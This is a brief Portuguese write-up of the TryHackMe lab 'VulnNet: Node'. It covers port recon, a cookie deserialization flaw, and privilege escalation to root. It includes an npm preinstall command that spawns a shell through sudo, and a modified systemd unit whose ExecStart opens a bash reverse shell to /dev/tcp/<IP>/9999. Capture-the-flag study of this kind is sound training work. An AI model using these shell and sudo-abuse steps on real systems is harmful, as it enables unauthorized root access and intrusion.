# VulnNet: Node
https://tryhackme.com/room/vulnnetnode

## Recon e exploração

### NMAP

    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Node.js Express framework

### Insecure Deserialization

O site tem um cookie de sessão em base64 onde o atributo "username" da para injetar um reverse shell

## Privesc

### www -> serv-manage

O usuario "www" tem permissão de rodar __/usr/bin/npm__ como usuario "serv-manage" sem a necessidade de inserir senha. Com isso basta rodar:

```sh
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
cd $TF
chmod 777 .
sudo -u serv-manage /usr/bin/npm run preinstall
```

### serv-manage -> root

Rodando "sudo -l" temos:

    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload

o "vulnnet-auto.timer" roda um arquivo chamado __vulnnet-job.service__ que possui permissão de escrita, alterando esse arquivo para acessar o root, ficou assim:

```sh
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP>/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

Depois bastou executar:

```sh
sudo -u root /bin/systemctl start vulnnet-auto.timer
```

GG
